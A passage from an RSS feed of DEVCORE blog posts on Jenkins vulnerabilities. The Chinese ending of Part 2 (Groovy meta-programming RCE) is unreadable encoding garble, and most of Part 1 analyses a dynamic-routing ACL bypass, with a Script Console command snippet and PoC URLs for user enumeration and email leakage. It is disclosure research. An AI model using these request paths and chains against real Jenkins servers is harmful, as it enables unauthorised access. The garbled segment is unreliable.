&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;åˆ°æ­¤ï¼Œæˆ‘å€‘å·²ç¶“å¯ä»¥å®Œæ•´çš„æ§åˆ¶é ç«¯ä¼ºæœå™¨! é€é Meta-Programming åœ¨èªæ³•æ¨¹è§£ææ™‚æœŸå»å¼•å…¥æƒ¡æ„çš„ JAR æª”ï¼Œå†é€é Java çš„ Static Initializer ç‰¹æ€§å»åŸ·è¡Œä»»æ„æŒ‡ä»¤! é›–ç„¶ Jenkins æœ‰å…§å»ºçš„ Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;)ï¼Œä½†é€™å€‹æ¼æ´æ˜¯åœ¨ç·¨è­¯éšæ®µè€ŒéåŸ·è¡Œéšæ®µï¼Œå°è‡´ Sandbox æ¯«ç„¡ç”¨æ­¦ä¹‹è™•!&lt;/p&gt;

&lt;p&gt;ç”±æ–¼é€™æ˜¯å°æ–¼ Groovy åº•å±¤çš„ä¸€ç¨®æ”»æ“Šæ–¹å¼ï¼Œå› æ­¤åªè¦æ˜¯æ‰€æœ‰å¯ä»¥ç¢°è§¸åˆ° Groovy è§£æçš„åœ°æ–¹çš†æœ‰å¯èƒ½æœ‰æ¼æ´ç”¢ç”Ÿ! è€Œé€™ä¹Ÿæ˜¯é€™å€‹æ¼æ´å¥½ç©çš„åœ°æ–¹ï¼Œæ‰“ç ´äº†ä¸€èˆ¬é–‹ç™¼è€…èªç‚ºæ²’æœ‰åŸ·è¡Œå°±ä¸æœƒæœ‰å•é¡Œçš„æ€ç¶­ï¼Œå°æ”»æ“Šè€…ä¾†èªªä¹Ÿç”¨äº†ä¸€å€‹æ²’æœ‰é›»è…¦ç§‘å­¸çš„ç†è«–çŸ¥è­˜èƒŒæ™¯ä¸æœƒçŸ¥é“çš„æ–¹æ³•æ”»æ“Š! ä¸ç„¶ä½ æ ¹æœ¬ä¸æœƒæƒ³åˆ° Meta-Programming! é™¤äº†æˆ‘å›å ±çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; èˆ‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; å…©å€‹é€²å…¥é»å¤–ï¼Œåœ¨æ¼æ´è¢«ä¿®å¾©å¾Œï¼Œ&lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; ä¹Ÿå¾ˆå¿«çš„æ‰¾åˆ°äº†å¦å¤–ä¸€å€‹&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;é€²å…¥é»&lt;/a&gt;å»è§¸ç™¼é€™å€‹æ¼æ´!&lt;/p&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œé€™å€‹æ¼æ´æ›´å¯ä»¥èˆ‡æˆ‘å‰ä¸€ç¯‡ &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; æ‰€ç™¼ç¾çš„æ¼æ´ä¸²èµ·ä¾†ï¼Œå»ç¹é Overall/Read çš„é™åˆ¶æˆç‚ºä¸€å€‹åç¬¦å…¶å¯¦ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´!(å¦‚æœä½ æœ‰å¥½å¥½çš„è®€å®Œé€™å…©ç¯‡æ–‡ç« ï¼Œæ‡‰è©²å°ä½ ä¸æ˜¯é›£äº‹XD) è‡³æ–¼æœ‰æ²’æœ‰æ›´å¤šçš„ç©æ³•? å°±äº¤çµ¦å¤§å®¶è‡ªç”±ç™¼æ®ä¸²å‡ºè‡ªå·±çš„æ”»æ“Šéˆå›‰!&lt;/p&gt;

&lt;p&gt;æ„Ÿè¬å¤§å®¶çš„é–±è®€ï¼ŒHacking Jenkins ç³»åˆ—æ–‡å°±åœ¨é€™è£¡å·®ä¸å¤šå…ˆå‘Šä¸€å€‹æ®µè½å›‰! æœªä¾†å°‡æœƒå†ç™¼è¡¨æ›´å¤šæœ‰è¶£çš„æŠ€è¡“ç ”ç©¶æ•¬è«‹æœŸå¾…!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In software engineering, the &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; is a best practice for developers to reduce routine works. In the CI/CD, the most well-known tool is Jenkins. Due to its ease of use, awesome Pipeline system and integration of Container, Jenkins is also the most widely used CI/CD application in the world. According to the &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM Ecosystem Report&lt;/a&gt; by Snyk in 2018, Jenkins held about 60% market share on the survey of CI/CD server.&lt;/p&gt;

&lt;p&gt;For Red Teamers, Jenkins is also the battlefield that every hacker would like to control. If someone takes control of the Jenkins server, he can gain amounts of source code and credential, or even control the Jenkins node! In our DEVCORE Red Team cases, there are also several cases that the whole corporation is compromised from simply a Jenkins server as our entry point!&lt;/p&gt;

&lt;p&gt;This article is mainly about a brief security review on Jenkins in the last year. During this review, we found 5 vulnerabilities including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Among them, the more discussed one is the vulnerability CVE-2018-1999002. This is an arbitrary file read vulnerability through an unusual attack vector! Tencent YunDing security lab has written a &lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;detailed advisory&lt;/a&gt; about that, and also demonstrated how to exploit this vulnerability from arbitrary file reading to RCE on a real Jenkins site which found from &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;However, we are not going to discuss that in this article. Instead, this post is about another vulnerability found while digging into Stapler framework in order to find a way to bypass the least privilege requirement &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; of CVE-2018-1999002! If you merely take a look at the advisory description, you may be curious â€“ Is it reality to gain code execution with just a crafted URL?&lt;/p&gt;

&lt;p&gt;From my own perspective, this vulnerability is just an Access Control List(ACL) bypass, but because this is a problem of the architecture rather than a single program, there are various ways to exploit this bug! In order to pay off the design debt, Jenkins team also takes lots of efforts (patches in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins side&lt;/a&gt; and &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler side&lt;/a&gt;) to fix that. The patch not only introduces a new routing blacklist and whitelist but also extends the original &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; to protect Jenkinsâ€™ routing. Now letâ€™s figure out why Jenkins need to make such a huge code modification!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-scope&quot;&gt;Review Scope&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;This is not a complete code review (An overall security review takes lots of timeâ€¦), so this review just aims at high impact bugs. The review scope includes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Core&lt;/li&gt;
  &lt;li&gt;Stapler Web Framework&lt;/li&gt;
  &lt;li&gt;Suggested Plugins&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During the installation, Jenkins asks whether you want to install suggested plugins such as Git, GitHub, SVN and Pipeline. Basically, most people choose yes, or they will get an inconvenient and hard-to-use Jenkins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-levels&quot;&gt;Privilege Levels&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Because the vulnerability is an ACL bypass, we need to introduce the privilege level in Jenkins first! In Jenkins, there are different kinds of ACL roles, Jenkins even has a specialized plugin &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt;(also in the suggested plugin list) to configure the detailed permission per project. From an attackerâ€™s view, we roughly classify the ACL into 3 types:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;

&lt;p&gt;You can fully control Jenkins. Once the attacker gets this permission, he can execute arbitrary Groovy code via &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;!&lt;/p&gt;
&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is the most hacker-friendly scenario, but itâ€™s hard to see this configuration publicly now due to the increase of security awareness and lots of bots scanning all the IPv4.&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;This can be enabled from the &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; and check the radio box:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Under this mode, all contents are visible and readable. Such as agent logs and job/node information. For attackers, the best benefit of this mode is the accessibility of a bunch of private source codes! However, the attacker cannot do anything further or execute Groovy scripts!&lt;/p&gt;

&lt;p&gt;Although this is not the default setting, for DevOps, they may still open this option for automations. According to a little survey on &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;, there are about 12% servers enabled this mode! We will call this mode &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;This is the default mode. Without a valid credential, you canâ€™t see any information! We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; to call this mode in following sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;

&lt;p&gt;To explain this vulnerability, we will start with Jenkinsâ€™ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;Dynamic Routing&lt;/a&gt;. In order to provide developers more flexibilities, Jenkins uses a naming convention to resolve the URL and invoke the method dynamically. Jenkins first tokenizes all the URL by &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;, and begins from &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; as the entry point to match the token one by one. If the token matches (1)public class member or (2)public class method correspond to following naming conventions, Jenkins invokes recursively!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, â€¦)&lt;/li&gt;
    &lt;li&gt;doDynamic(â€¦)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;It looks like Jenkins provides developers a lot of flexibility. However, too much freedom is not always a good thing. There are two problems based on this naming convention!&lt;/p&gt;

&lt;h3 id=&quot;1-everything-is-the-subclass-of-javalangobject&quot;&gt;1. Everything is the Subclass of &lt;code class=&quot;highlighter-rouge&quot;&gt;java.lang.Object&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;In Java, everything is a subclass of &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt;. Therefore, all objects must exist the method - &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt;, and the name of &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; just matches the naming convention rule &lt;code class=&quot;highlighter-rouge&quot;&gt;#1&lt;/code&gt;! So the method &lt;code class=&quot;highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; can be also invoked during Jenkins dynamic routing!&lt;/p&gt;

&lt;h3 id=&quot;2-whitelist-bypass&quot;&gt;2. Whitelist Bypass&lt;/h3&gt;

&lt;p&gt;As mentioned before, the biggest difference between &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; is, if the flag set to &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt;, the entry point will do one more check in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt;. The check is a white-list based URL prefix check and here is the list:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That means you are restricted to those entrances, but if you can find a cross reference from the white-list entrance jump to other objects, you can still bypass this URL prefix check! It seems a little bit hard to understand. Letâ€™s give a simple example to demonstrate the dynamic routing:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above URL will invoke following methods in sequence!&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This execution chain seems smooth, but sadly, it can not retrieve the result. Therefore, this is not a potential risk, but itâ€™s still a good case to understand the mechanism!&lt;/p&gt;

&lt;p&gt;Once we realize the principle, the remaining part is like solving a maze. &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; is the entry point. Every member in this object can references to a new object, so our work is to chain the object layer by layer till the exit door, that is, the dangerous method invocation!&lt;/p&gt;

&lt;p&gt;By the way, the saddest thing is that this vulnerability cannot invoke the SETTER, otherwise this would definitely be another interesting classLoader manipulation bug just like &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; and &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt;!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;How to exploit? In brief, the whole thing this bug can achieve is to use cross reference objects to bypass ACL policy. To leverage it, we need to find a proper gadget so that we can invoke the object we prefer in this object-forest more conveniently! Here we choose the gadget:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The gadget will invoke following methods sequencely.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In Jenkins, all configurable objects will extend the type &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt;. And, any class who extends the &lt;code class=&quot;highlighter-rouge&quot;&gt;Descriptor&lt;/code&gt; type is accessible by method &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt;. In general, there are totally about 500 class types can be accessed! But due to the architecture of Jenkins. Most developers will check the permission before the dangerous action again. So even we can find a object reference to the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;, without the permission &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt;, we still canâ€™t do anything :(&lt;/p&gt;

&lt;p&gt;Even so, this vulnerability can still be considered as a stepping stone to bypass the first ACL restriction and to chain other bugs. We will show 3 vulnerability-chains as our case study! (Although we just show 3 cases, there are more than 3! If you are intersted, itâ€™s highly recommended to find others by yourself :P )&lt;/p&gt;

&lt;p&gt;P.S. It should be noted that in the method &lt;code class=&quot;highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt;, it will invoke &lt;code class=&quot;highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;create&lt;/code&gt; flag set to &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;. This result to the creation of a temporary user in memory(which will be listed in the user list but canâ€™t sign in). Although itâ€™s harmless, it is still recognized as a security issue in &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-pre-auth-user-information-leakage&quot;&gt;1. Pre-auth User Information Leakage&lt;/h3&gt;

&lt;p&gt;While testing Jenkins, itâ€™s a common scenario that you want to perform a brute-force attack but you donâ€™t know which account you can try(a valid credential can read the source at least so itâ€™s worth to be the first attempt).&lt;/p&gt;

&lt;p&gt;In this situation, this vulnerability is useful!&lt;br /&gt;
Due to the lack of permission check on search functionality. By modifying the &lt;code class=&quot;highlighter-rouge&quot;&gt;keyword&lt;/code&gt; from a to z, an attacker can list all users on Jenkins!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, this vulnerability can be also chained with &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; which reported by &lt;code class=&quot;highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; to leak userâ€™s email address! Such as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-chained-with-cve-2018-1000600-to-a-pre-auth-fully-responded-ssrf&quot;&gt;2. Chained with CVE-2018-1000600 to a Pre-auth Fully-responded SSRF&lt;/h3&gt;

&lt;p&gt;The next bug is &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, this bug is reported by &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(Yes, itâ€™s me :P). About this vulnerability, the official description is:&lt;/p&gt;

&lt;blockquote&gt;
